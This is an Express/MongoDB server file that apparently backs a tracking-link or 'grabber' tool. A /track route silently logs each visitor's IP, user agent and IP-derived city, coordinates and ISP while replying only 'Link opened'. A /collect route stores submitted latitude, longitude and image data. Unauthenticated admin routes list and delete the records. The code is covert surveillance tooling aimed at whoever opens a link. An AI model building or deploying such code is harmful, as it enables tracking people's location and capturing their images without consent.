const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

require("dotenv").config();

const app = express();

/* Middleware */
app.use(cors());
app.use(express.json({ limit: "10mb" }));

/* =======================
   MongoDB Connection
======================= */
async function connectionDB() {
  try {
    if (mongoose.connection.readyState === 1) return;

    await mongoose.connect(process.env.dbURL);
    console.log("MongoDB connected");
  } catch (err) {
    console.error("MongoDB connection failed:", err);
    process.exit(1); // Render restart
  }
}

/* =======================
   Schemas
======================= */
const dataSchema = new mongoose.Schema(
  {
    latitude: String,
    longitude: String,
    image: String,
    userAgent: String,
    time: String,
  },
  { timestamps: true }
);

const trackerSchema = new mongoose.Schema(
  {
    ip: String,
    userAgent: String,
    time: String,
    country: String,
    region: String,
    city: String,
    latitude: Number,
    longitude: Number,
    isp: String,
  },
  { timestamps: true }
);

/* =======================
   Models (SAFE)
======================= */
const CollectedData =
  mongoose.models.CollectedData ||
  mongoose.model("CollectedData", dataSchema);

const TrackedData =
  mongoose.models.TrackedData ||
  mongoose.model("TrackedData", trackerSchema);

/* =======================
   Routes
======================= */

app.get("/", (req, res) => {
  res.send("Backend is running 🚀");
});

app.post("/collect", async (req, res) => {
  try {
    console.log("Incoming body:", req.body);
    await connectionDB();
    await CollectedData.create(req.body);
    res.json({ message: "Data stored successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to store data" });
  }
});

app.get("/admin/data", async (req, res) => {
  try {
    await connectionDB();
    const allData = await CollectedData.find().sort({ createdAt: -1 });
    res.json(allData);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to fetch data" });
  }
});

app.delete("/admin/clear", async (req, res) => {
  try {
    await connectionDB();
    const result = await CollectedData.deleteMany({});
    res.json({ message: `Deleted ${result.deletedCount} records` });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to clear data" });
  }
});

app.get("/track", async (req, res) => {
  try {
    await connectionDB();

    let ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress ||
      "8.8.8.8";

    ip = ip.replace("::ffff:", "");

    let location = {};

    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`, {
        timeout: 5000,
      });

      const text = await response.text();

      // 👇 Only parse if it is JSON
      if (text.startsWith("{")) {
        location = JSON.parse(text);
      } else {
        console.warn("IP API non-JSON response:", text);
      }
    } catch (apiErr) {
      console.error("IP API failed:", apiErr);
    }

    await TrackedData.create({
      ip,
      userAgent: req.headers["user-agent"] || "unknown",
      time: new Date().toLocaleString("en-IN"),
      country: location.country_name || "unknown",
      region: location.region || "unknown",
      city: location.city || "unknown",
      latitude: location.latitude || null,
      longitude: location.longitude || null,
      isp: location.org || "unknown",
    });

    // 🔐 NEVER expose errors to user
    res.status(200).send("Link opened");
  } catch (err) {
    console.error("Track route crashed:", err);
    res.status(200).send("Link opened");
  }
});


app.get("/tracked/data", async (req, res) => {
  try {
    await connectionDB();
    const allData = await TrackedData.find().sort({ createdAt: -1 });
    res.status(200).json(allData);
  } catch (err) {
    console.error("Tracked data error:", err);
    res.status(500).json({ error: "Failed to fetch tracked data" });
  }
});

/* =======================
   Server Start (Render)
======================= */
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
